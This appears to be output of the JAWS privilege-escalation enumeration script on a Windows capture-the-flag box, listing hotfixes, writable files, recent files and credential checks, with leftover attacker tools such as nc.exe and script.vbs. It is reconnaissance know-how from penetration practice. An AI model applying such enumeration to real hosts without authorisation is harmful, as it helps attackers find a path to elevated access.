KB2967917
KB2971203
KB2971850
KB2973351
KB2973448
KB2975061
KB2976627
KB2977629
KB2981580
KB2987107
KB2989647
KB2998527
KB3000850
KB3003057
KB3014442



-----------------------------------------------------------
 Program Folders
-----------------------------------------------------------

C:\Program Files
-------------
Common Files
Embedded Lockdown Manager
Internet Explorer
VMware
Windows Mail
Windows NT
WindowsPowerShell


C:\Program Files (x86)
-------------------
Common Files
Internet Explorer
Microsoft.NET
Windows Mail
Windows NT
WindowsPowerShell



-----------------------------------------------------------
 Files with Full Control and Modify Access
-----------------------------------------------------------

C:\tmp\jaws.ps1



C:\Users\kostas\Desktop\user.txt
C:\Users\Public\script.vbs


-----------------------------------------------------------
 Folders with Full Control and Modify Access
-----------------------------------------------------------

Failed to read more folders

Failed to read more folders

-----------------------------------------------------------
 Mapped Drives
-----------------------------------------------------------

C:


-----------------------------------------------------------
 Unquoted Service Paths
-----------------------------------------------------------

-----------------------------------------------------------
 Recent Documents
-----------------------------------------------------------

AutomaticDestinations
CustomDestinations
39719.lnk
Downloads.lnk
hfs2.3_288.lnk
user.txt.lnk



-----------------------------------------------------------
 Potentially Interesting Files in Users Directory
-----------------------------------------------------------
C:\Users\kostas\Desktop\user.txt
C:\Users\kostas\Downloads\hfs2.3_288.zip
C:\Users\Public\script.vbs

-----------------------------------------------------------
 10 Last Modified Files in C:\User
-----------------------------------------------------------
C:\Users\kostas\Links
C:\Users\kostas\Downloads
C:\Users\kostas\Downloads\hfs2.3_288.zip
C:\Users\kostas\Desktop\hfs.exe
C:\Users\kostas\Desktop\user.txt
C:\Users\kostas\Desktop
C:\Users\Public\script.vbs
C:\Users\Public
C:\Users\Public\nc.exe
C:\Users\kostas

-----------------------------------------------------------
 MUICache Files
-----------------------------------------------------------
LangID
C:\Windows\Explorer.exe.FriendlyAppName
C:\Windows\Explorer.exe.ApplicationCompany
C:\Windows\system32\NOTEPAD.EXE.FriendlyAppName
C:\Windows\system32\NOTEPAD.EXE.ApplicationCompany

-----------------------------------------------------------
 System Files with Passwords
-----------------------------------------------------------

-----------------------------------------------------------
 AlwaysInstalledElevated Registry Key
-----------------------------------------------------------

-----------------------------------------------------------
 Stored Credentials
-----------------------------------------------------------

Currently stored credentials:

* NONE *

-----------------------------------------------------------
 Checking for AutoAdminLogon
-----------------------------------------------------------

```